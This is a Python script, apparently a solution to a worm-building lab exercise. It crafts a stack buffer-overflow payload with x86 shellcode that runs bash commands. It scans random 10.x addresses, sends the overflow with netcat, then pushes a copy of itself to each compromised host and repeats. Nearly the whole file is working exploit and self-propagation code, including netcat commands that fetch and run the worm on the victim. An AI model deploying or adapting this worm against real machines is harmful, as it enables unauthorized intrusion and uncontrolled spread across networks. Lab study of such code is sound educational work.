#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint
import fcntl

# Function to check if the badfile2 exists
def checkBadfilePresence():
    return os.path.exists('badfile2')
def checkAttacker():
    return os.path.exists('IAMATTACKER')
# Check if badfile2 is already present
if checkBadfilePresence():
    print("This host is already infected. Exiting...", flush=True)
    exit(0)

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   "nc -lnv 8080 > worm.py;                                     "
   "chmod a+x worm.py; ./worm.py                               *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')

# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd588 + (500-len(shellcode))  # Need to change
   offset = (0xffffd5f8 - 0xffffd588) + 0x04

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile2', 'wb') as f:
      f.write(content)

   
# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
    while True:
        # Generate a random IP candidate
        Tarip = f"10.{randint(150, 180)}.0.{randint(70, 100)}"
        
        try:
            # Ping the IP candidate and capture the output
            output = subprocess.check_output(f"ping -q -c1 -W1 {Tarip}", shell=True)
            # Check if the ping was successful by searching for '1 received' in the output
            targetFound = b'1 received' in output
        except subprocess.CalledProcessError:
            # If ping failed, set targetFound to False
            targetFound = False
        
        # If target is found, print a message and return the IP candidate
        if targetFound:
            print(f"*** Target {Tarip} is alive, launch the attack", flush=True)
            return Tarip

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

while True:
    
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    createBadfile()
    subprocess.run([f"cat badfile2 | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(10)

    # send self to the infected machine
    subprocess.run([f"cat worm.py | nc -w5 {targetIP} 8080"], shell=True)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 
    if checkAttacker():
    	print("Let's move", flush=True)
    	exit(0)
